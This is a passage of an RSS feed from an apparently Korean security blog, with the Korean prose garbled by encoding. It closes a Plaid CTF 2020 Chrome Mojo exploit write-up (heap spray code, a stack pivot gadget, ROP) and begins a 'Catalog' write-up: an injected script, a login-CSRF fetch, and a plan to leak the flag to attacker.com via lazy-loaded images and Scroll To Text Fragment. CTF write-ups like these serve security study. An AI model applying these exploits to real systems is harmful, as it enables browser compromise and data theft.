    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;bary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// make a copy&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// w64(ab, ab.byteLength - 8, i);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;bary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;xxxxxxxx&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;bary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;blob_spray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Blob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;blob_cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë‹¤ìŒìœ¼ë¡œ raxë¥¼ ì¡°ì‘í•˜ê¸° ìœ„í•´ Blobì„ ì´ìš©í•´ì„œ heap sprayë¥¼ í–ˆë‹¤. ê¼­ Blobì„ ì‚¬ìš©í•˜ì§€ ì•Šë”ë¼ë„ PlaidStoreImplì— ìˆëŠ” uint8_t vectorë¡œë„ sprayëŠ” ê°€ëŠ¥í–ˆì„ ê²ƒ ê°™ë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;4-stack-í”¼ë²—-ì´í›„-rop&quot;&gt;4. stack í”¼ë²— ì´í›„ rop&lt;/h3&gt;

&lt;p&gt;stack í”¼ë²—ì„ ìœ„í•´ ì—¬ëŸ¬ ê°€ì ¯ë“¤ì„ ì°¾ì•„ë³´ì•˜ëŠ”ë° ë§ˆì¹¨ chrome ë°”ì´ë„ˆë¦¬ì— &lt;code class=&quot;highlighter-rouge&quot;&gt;push rax; pop rsp; ret&lt;/code&gt; ê°€ì ¯ì´ ìˆì—ˆë‹¤. ì´ ê°€ì ¯ì„ í†µí•´ raxë¥¼ rspë¡œ ë³€ê²½í•˜ì—¬ rop chainì„ í˜¸ì¶œí•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;3-conclusion&quot;&gt;3. Conclusion&lt;/h1&gt;

&lt;p&gt;mojo ë¬¸ì œë¥¼ í’€ë©´ì„œ chrome ipc êµ¬ì¡°ì— ê½¤ ë§ì€ê²ƒì„ ì•Œê²Œ ë˜ì—ˆë‹¤. ê·¸ë¦¬ê³  ì§€ê¸ˆìƒê°í•´ë³´ë©´ sprayë‚˜ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±° í•˜ëŠ” ê³¼ì •ì—ì„œ ë¹„íš¨ìœ¨ì ì¸ ì½”ë“œë“¤ì´ ë„ˆë¬´ ë§ì•„   exploit reliability ê°€ ë‚®ì•˜ë‹¤ê³  ìƒê°í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ì‹¤ì œ ëŒ€íšŒì—ì„œ ì´ ë¬¸ì œë¥¼ ëª»í‘¼ ì´ìœ ê°€ rax ì»¨íŠ¸ë¡¤ì´ ê±°ì˜ 0.01% í™•ë¥ ë¡œ ì„±ê³µí•´ì„œ ë””ë²„ê¹…ì´ ë§¤ìš° í˜ë“¤ì—ˆê¸° ë•Œë¬¸ì´ë‹¤. ì¢€ ë” ì‹œê°„ì´ ë§ì•˜ë‹¤ë©´ ë‹¤ì‹œ ì²˜ìŒë¶€í„° ì½”ë“œë¥¼ ì‘ì„±í•´ íš¨ìœ¨ì ì¸ exploitì„ ì‘ì„±í•  ìˆ˜ ìˆì—ˆì„ê²ƒ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;ìœ„ì—ì„œ ì‹œë„í•œ ë°©ë²• ë§ê³  ì—¬ëŸ¬ write-upì— ì¢‹ì€ exploit ë°©ë²•ë“¤ì´ ë§ìœ¼ë‹ˆ ì¶”ê°€ì ìœ¼ë¡œ exploitì— ëŒ€í•´ ê¶ê¸ˆí•œ ì ì´ ìˆë‹¤ë©´ ë‹¤ë¥¸ ë¬¸ì„œë“¤ì„ ì°¸ê³ í•´ ë³´ëŠ”ê²Œ ì¢‹ì„ ê²ƒ ê°™ë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-04-01/Plaid-CTF-Mojo</link>
        <guid isPermaLink="true">http://localhost:4000/2020-04-01/Plaid-CTF-Mojo</guid>
        
        <category>ctf</category>
        
        <category>write-up</category>
        
        
      </item>
    
      <item>
        <title>2020 Plaid CTF - Catalog</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê°•ì¸ìš±&lt;/p&gt;

&lt;p&gt;2020 Plaid CTFì— ì¶œì œëœ ë¬¸ì œì¤‘ 0 ì†”ë²„ì˜€ë˜ í¥ë¯¸ë¡œìš´ ë¬¸ì œì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ë¬¸ì œ ì¶œì œì : &lt;a href=&quot;https://twitter.com/thebluepichu&quot;&gt;https://twitter.com/thebluepichu&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ì´ ë¬¸ì œì— ì²˜ìŒ ì ‘ì† í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ íšŒì›ê°€ì…, ë¡œê·¸ì¸, ë¡œê·¸ì•„ì›ƒ ê¸€ ì‘ì„±ì„ í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆìœ¼ë©°, ë¡œê·¸ì¸ì‹œ ê´€ë ¨ëœ ì •ë³´(BAM! ~~~~)ê°€ ìƒë‹¨ì— ì¶œë ¥ëœë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/acbaedd9-1dd4-4fdb-96e9-eb34ee740b47/a8932b43-9c1d-48e3-87ae-2123769aa5f4.png&quot; alt=&quot;/assets/acbaedd9-1dd4-4fdb-96e9-eb34ee740b47/a8932b43-9c1d-48e3-87ae-2123769aa5f4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CSPë¥¼ í™•ì¸í•´ë³´ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Security&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;nonce-xxxxx&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;font&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fonts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;gstatic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//www.google.com/recaptcha/&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;nonceê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©° ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•˜ë”ë¼ë„ ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. í•œê°€ì§€ ì£¼ëª©í•  ì ì€ img íƒœê·¸ì˜ ê²½ë¡œë¥¼ ì™¸ë¶€ ë§í¬ë¡œ ì„¤ì •í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ë¬¸ì œì˜ ëª©ì ì€ ë¬¸ì œ ì¶œì œìê°€ ì‘ì„±í•œ id=3ì˜ ê²Œì‹œê¸€ì—ì„œ í”Œë˜ê·¸ë¥¼ ê°€ì ¸ì™€ì•¼ í•œë‹¤. í”Œë˜ê·¸ í¬ë§·ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Flag&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/^&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PCTF&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Z0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í”Œë˜ê·¸ í¬ë§·ì„ ì£¼ì—ˆë‹¤ëŠ” ì ì—ì„œ ì–´ë– í•œ ì‘ì—…ì„ ì´ìš©í•´ ë¸Œë£¨íŠ¸ í¬ì‹±ìœ¼ë¡œ í”Œë˜ê·¸ë¥¼ â€œê²€ìƒ‰â€í•´ì„œ ì½ì–´ì•¼ í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì˜ˆìƒí•´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ê¸€ì„ ì‘ì„±í•˜ì—¬ ë´‡ì´ ê¸€ì„ ì½ê²Œí•œë‹¤.&lt;/li&gt;
  &lt;li&gt;id=3 ê²Œì‹œê¸€ì— ì ‘ê·¼í•˜ì—¬ ì–´ë– í•œ ë°©ë²•ì„ í†µí•´ ì´ë¯¸ì§€ ì§€ì—° ë¡œë”©(loading=lazy)ì„ í™œìš©í•˜ì—¬ í”Œë˜ê·¸ë¥¼ ìœ ì¶”í•œë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ëŒ€íšŒ ë‹¹ì‹œì—ëŠ” â€œì–´ë– í•œ ë°©ë²•â€ì„ ì°¾ì„ ìˆ˜ ì—†ì—ˆì§€ë§Œ Chrome 80 ë¶€í„° Scroll To Text Fragmentê°€ ê°€ëŠ¥í•˜ë‹¤ê³  í•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.chromestatus.com/feature/4733392803332096&quot;&gt;https://www.chromestatus.com/feature/4733392803332096&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Scroll To Text Fragmentì€ ì•„ë˜ì™€ ê°™ì´ ì‚¬ìš© ê°€ëŠ¥í•˜ë‹¤. ì´ ê¸°ëŠ¥ì„ ì´ìš©í•˜ê¸° ìœ„í•´ì„  ì‚¬ìš©ì ì œìŠ¤ì²˜(íƒ­, í´ë¦­)ê°€ í•„ìš”í•˜ë‹¤. ì¶œì œìëŠ” uBlock Origin í”ŒëŸ¬ê·¸ì¸ì´ í™œì„±í™”ë˜ì–´ ìˆì„ ê²½ìš°ë¥¼ ê°€ì •í–ˆë‹¤.&lt;/p&gt;

&lt;p&gt;STTF ë³´ì•ˆ ì´ìŠˆ&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//docs.google.com/document/d/1YHcl1-vE_ZnZ0kL2almeikAj2gkwCq8_5xwIae7PVik/edit#heading=h.uoiwg23pt0tx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì‚¬ìš©ë²•&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//en.wikipedia.org/wiki/Cat#:~:text=On&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ë©´ ë¬¸ì„œ ë‚´ìš©ì¤‘ â€œOnâ€ì´ë¼ëŠ” ê¸€ìê°€ ìˆëŠ” ê³³ìœ¼ë¡œ ìŠ¤í¬ë¡¤ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´, ì´ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ í”Œë˜ê·¸ë¥¼ ì½ìœ¼ë ¤ë©´ id=3 ê²Œì‹œë¬¼ì— ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚½ì…ì´ ë˜ì–´ì•¼í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ìŠ¤í¬ë¦½íŠ¸ ì‚½ì…ì€ ë¡œê·¸ì¸ì‹œ ìƒë‹¨ì— í‘œì‹œë˜ëŠ” ì•„ì´ë””ë¡œ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë¡œê·¸ì¸ì„ ì‹¤íŒ¨í•´ë„ ìƒë‹¨ì— ë©”ì„¸ì§€ê°€ ëœ¨ê¸° ë•Œë¬¸ì— ìŠ¤í¬ë¦½íŠ¸ ì‚½ì…ì´ ê°€ëŠ¥í•´ì§„ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/acbaedd9-1dd4-4fdb-96e9-eb34ee740b47/a8932b43-9c1d-48e3-87ae-2123769aa5f4.png&quot; alt=&quot;/assets/acbaedd9-1dd4-4fdb-96e9-eb34ee740b47/a8932b43-9c1d-48e3-87ae-2123769aa5f4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì•„ë˜ì™€ ê°™ì´ ìœ ì €ì´ë¦„ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•œ í›„ id=3ë¡œ ì´ë™ì‹œí‚¤ë©´ ìƒë‹¨ì— ìŠ¤í¬ë¦½íŠ¸ê°€ ì‚½ì…ëœë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://catalog.pwni.ng/user.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;no-cors&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;credentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;content-type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
	&lt;span class=&quot;na&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;username=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;lt;myscript&amp;gt;test code&amp;lt;/myscript&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;password=hello&amp;amp;action=login&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://catalog.pwni.ng/issue.php?id=3&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ì œ ë‹¨ì„œë“¤ì„ ëª¨ì•„ì„œ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì¬êµ¬ì„± í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ê´€ë¦¬ìê°€ ublock origin í”ŒëŸ¬ê·¸ì¸ì„ ì‚¬ìš©ì¤‘ì¸ ìƒíƒœì—ì„œ ê²Œì‹œê¸€ì„ í´ë¦­í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;meta tagë¥¼ ì´ìš©í•´ attacker.comìœ¼ë¡œ ì´ë™ ì‹œí‚¨ë‹¤.&lt;/li&gt;
  &lt;li&gt;attacker.comì—ì„œ ë¡œê·¸ì¸ ìš”ì²­ì„ ë°œìƒì‹œì¼œ id=3 ê²Œì‹œë¬¼ ìƒë‹¨ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ìŠ¤í¬ë¦½íŠ¸ë¡œ meta tagë¥¼ ì´ìš©í•´ Scroll To Text Fragmentë¥¼ ë°œìƒì‹œí‚¨ë‹¤.&lt;/li&gt;
  &lt;li&gt;ì´ë¯¸ì§€ ì§€ì—° ë¡œë”©(&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;http://attacker.com/img&quot; loading=&quot;lazy&quot;&amp;gt;&lt;/code&gt;)ì„ ì´ìš©í•´ í”Œë˜ê·¸ê°€ ê²€ìƒ‰ë  ê²½ìš° attacker.comì˜ ì´ë¯¸ì§€ë¥¼ ë¡œë“œí•˜ë„ë¡ í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ì´ë¯¸ì§€ê°€ ë¡œë”©ë˜ë©´ ê²€ìƒ‰ì´ ë˜ì—ˆë‹¤ëŠ” ëœ»ì´ê³  ë¡œë”©ì´ ì•ˆë˜ë©´ ê²€ìƒ‰ì´ ì•ˆë˜ì—ˆë‹¤ëŠ” ëœ»ì´ë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ì˜ˆì‹œ ì½”ë“œ&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

